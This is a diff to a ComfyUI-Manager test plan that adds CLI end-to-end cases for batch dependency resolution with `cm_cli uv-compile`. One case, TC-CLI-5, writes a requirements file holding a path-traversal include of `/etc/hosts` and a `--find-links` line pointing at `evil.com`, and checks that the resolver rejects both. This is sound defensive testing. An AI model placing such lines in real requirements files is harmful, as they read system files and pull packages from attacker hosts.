@@ -46,7 +46,9 @@ Content-Type: application/json
 | `mode` | string | `"remote"`, `"local"`, or `"cache"` |
 | `channel` | string | `"default"`, `"recent"`, `"legacy"`, etc. |
 
-> **Note**: `cm_cli` imports from `legacy/manager_core.py` and does **not** participate in unified resolver. CLI-based installs always use per-node pip. See [Out of Scope](#out-of-scope-deferred).
+> **Note**: `cm_cli` supports unified resolver via `cm_cli uv-compile` (standalone) and
+> `cm_cli install --uv-compile` (install-time batch resolution). Without `--uv-compile`,
+> installs use per-node pip via `legacy/manager_core.py`.
 
 ---
 
@@ -54,9 +56,169 @@ Content-Type: application/json
 
 The following are intentionally **not tested** in this version:
 
-- **cm_global integration**: `pip_blacklist`, `pip_overrides`, `pip_downgrade_blacklist` are passed as empty defaults to the resolver. Integration with cm_global is deferred to a future commit. Do not file defects for blacklist/override/downgrade behavior in unified mode.
-- **cm_cli (CLI tool)**: `cm_cli` imports from `legacy/manager_core.py` which does not have unified resolver integration. CLI-based installs always use per-node pip install regardless of the `use_unified_resolver` flag. This is a known limitation, not a defect.
+- **cm_global integration (startup path only)**: At startup (`prestartup_script.py`), `pip_blacklist`, `pip_overrides`, `pip_downgrade_blacklist` are passed as empty defaults to the resolver. Integration with cm_global at startup is deferred to a future commit. Do not file defects for blacklist/override/downgrade behavior in startup unified mode. Note: `cm_cli uv-compile` and `cm_cli install --uv-compile` already pass real `cm_global` values (see PRD Future Extensions).
+- **cm_cli per-node install (without --uv-compile)**: `cm_cli install` without `--uv-compile` imports from `legacy/manager_core.py` and uses per-node pip install. This is by design — use `cm_cli install --uv-compile` or `cm_cli uv-compile` for batch resolution.
 - **Standalone `execute_install_script()`** (`glob/manager_core.py` ~line 1881): Has a unified resolver guard (`manager_util.use_unified_resolver`), identical to the class method guard. Reachable from the glob API via `update-comfyui` tasks (`update_path()` / `update_to_stable_comfyui()`), git-based node pack updates (`git_repo_update_check_with()` / `fetch_or_pull_git_repo()`), and gitclone operations. Also called from CLI and legacy server paths. The guard behaves identically to the class method at all call sites; testing it separately adds no coverage beyond TC-14 Path 1.
+
+## CLI E2E Tests (`cm_cli uv-compile`)
+
+These tests do **not** require ComfyUI server. Only a venv with `COMFYUI_PATH` set and
+the E2E environment from `setup_e2e_env.sh` are needed.
+
+**Common setup**:
+```bash
+source tests/e2e/scripts/setup_e2e_env.sh   # → E2E_ROOT=...
+export COMFYUI_PATH="$E2E_ROOT/comfyui"
+VENV_PY="$E2E_ROOT/venv/bin/python"
+```
+
+---
+
+### TC-CLI-1: Normal Batch Resolution [P0]
+
+**Steps**:
+1. Create a test node pack with a simple dependency:
+```bash
+mkdir -p "$COMFYUI_PATH/custom_nodes/test_cli_pack"
+echo "chardet>=5.0" > "$COMFYUI_PATH/custom_nodes/test_cli_pack/requirements.txt"
+```
+2. Run:
+```bash
+$VENV_PY -m cm_cli uv-compile
+```
+
+**Verify**:
+- Exit code: 0
+- Output contains: `Resolved N deps from M source(s)`
+- `chardet` is importable: `$VENV_PY -c "import chardet"`
+
+**Cleanup**: `rm -rf "$COMFYUI_PATH/custom_nodes/test_cli_pack"`
+
+---
+
+### TC-CLI-2: No Custom Node Packs [P1]
+
+**Steps**:
+1. Ensure `custom_nodes/` contains no node packs (only symlinks like `ComfyUI-Manager`
+   or empty dirs may remain)
+2. Run:
+```bash
+$VENV_PY -m cm_cli uv-compile
+```
+
+**Verify**:
+- Exit code: 0
+- Output contains: `No custom node packs found` OR `Resolution complete (no deps needed)`
+
+---
+
+### TC-CLI-3: uv Unavailable [P0]
+
+**Steps**:
+1. Create a temporary venv **without** uv:
+```bash
+python3 -m venv /tmp/no_uv_venv
+/tmp/no_uv_venv/bin/pip install comfyui-manager   # or install from local
+```
+2. Ensure no standalone `uv` in PATH:
+```bash
+PATH="/tmp/no_uv_venv/bin" COMFYUI_PATH="$COMFYUI_PATH" \
+  /tmp/no_uv_venv/bin/python -m cm_cli uv-compile
+```
+
+**Verify**:
+- Exit code: 1
+- Output contains: `uv is not available`
+
+**Cleanup**: `rm -rf /tmp/no_uv_venv`
+
+---
+
+### TC-CLI-4: Conflicting Dependencies [P0]
+
+**Steps**:
+1. Create two node packs with conflicting pinned versions:
+```bash
+mkdir -p "$COMFYUI_PATH/custom_nodes/conflict_a"
+echo "numpy==1.24.0" > "$COMFYUI_PATH/custom_nodes/conflict_a/requirements.txt"
+mkdir -p "$COMFYUI_PATH/custom_nodes/conflict_b"
+echo "numpy==1.26.0" > "$COMFYUI_PATH/custom_nodes/conflict_b/requirements.txt"
+```
+2. Run:
+```bash
+$VENV_PY -m cm_cli uv-compile
+```
+
+**Verify**:
+- Exit code: 1
+- Output contains: `Resolution failed`
+
+**Cleanup**: `rm -rf "$COMFYUI_PATH/custom_nodes/conflict_a" "$COMFYUI_PATH/custom_nodes/conflict_b"`
+
+---
+
+### TC-CLI-5: Dangerous Pattern Skip [P0]
+
+**Steps**:
+1. Create a node pack mixing valid and dangerous lines:
+```bash
+mkdir -p "$COMFYUI_PATH/custom_nodes/test_dangerous"
+cat > "$COMFYUI_PATH/custom_nodes/test_dangerous/requirements.txt" << 'EOF'
+chardet>=5.0
+-r ../../../etc/hosts
+--find-links http://evil.com/pkgs
+requests>=2.28
+EOF
+```
+2. Run:
+```bash
+$VENV_PY -m cm_cli uv-compile
+```
+
+**Verify**:
+- Exit code: 0
+- Output contains: `Resolved 2 deps` (chardet + requests, dangerous lines skipped)
+- `chardet` and `requests` are importable
+- Log contains: `rejected dangerous line` for the `-r` and `--find-links` lines
+
+**Cleanup**: `rm -rf "$COMFYUI_PATH/custom_nodes/test_dangerous"`
+
+---
+
+### TC-CLI-6: install --uv-compile Single Pack [P0]
+
+**Steps**:
+1. In clean E2E environment, install a single node pack:
+```bash
+$VENV_PY -m cm_cli install comfyui-impact-pack --uv-compile --mode remote
+```
+
+**Verify**:
+- Exit code: 0
+- Per-node pip install does NOT run (no `Install: pip packages` in output)
+- `install.py` still executes
+- Output contains: `Resolved N deps from M source(s)`
+- Impact Pack dependencies are importable: `cv2`, `skimage`, `dill`, `scipy`, `matplotlib`
+
+---
+
+### TC-CLI-7: install --uv-compile Multiple Packs [P0]
+
+**Steps**:
+1. After TC-CLI-6 (or with impact-pack already installed), install two more packs at once:
+```bash
+$VENV_PY -m cm_cli install comfyui-impact-subpack comfyui-inspire-pack --uv-compile --mode remote
+```
+
+**Verify**:
+- Exit code: 0
+- Both packs installed: `[INSTALLED] comfyui-impact-subpack`, `[INSTALLED] comfyui-inspire-pack`
+- Batch resolution runs once (not twice) after all installs complete
+- Resolves deps for **all** installed packs (impact + subpack + inspire + manager)
+- New dependencies importable: `cachetools`, `webcolors`, `piexif`
+- Previously installed deps (from step 1) remain intact
+
+---
 
 ## Test Fixture Setup
 
@@ -597,6 +759,13 @@ The following behaviors were confirmed during manual E2E testing:
 | 16 | P1 | Generic exception fallback | Distinct from uv-absent and batch-failed |
 | 17 | P0 | Restart dependency detection | Incremental node pack discovery across restarts |
 | 18 | P0 | Real node pack integration | Impact + Inspire Pack full pipeline |
+| CLI-1 | P0 | CLI normal batch resolution | exit 0, deps installed |
+| CLI-2 | P1 | CLI no custom nodes | exit 0, graceful empty |
+| CLI-3 | P0 | CLI uv unavailable | exit 1, error message |
+| CLI-4 | P0 | CLI conflicting deps | exit 1, resolution failed |
+| CLI-5 | P0 | CLI dangerous pattern skip | exit 0, dangerous skipped |
+| CLI-6 | P0 | install --uv-compile single | per-node pip skipped, batch resolve |
+| CLI-7 | P0 | install --uv-compile multi | batch once after all installs |
 
 ### Traceability
 
@@ -615,3 +784,5 @@ The following behaviors were confirmed during manual E2E testing:
 | FR-8: Restart discovery | TC-17 |
 | FR-9: Real-world compatibility | TC-17, TC-18 |
 | FR-2: Input sanitization (git URLs) | TC-8, TC-18 |
+| FR-10: CLI batch resolution | TC-CLI-1, TC-CLI-2, TC-CLI-3, TC-CLI-4, TC-CLI-5 |
+| FR-11: CLI install --uv-compile | TC-CLI-6, TC-CLI-7 |
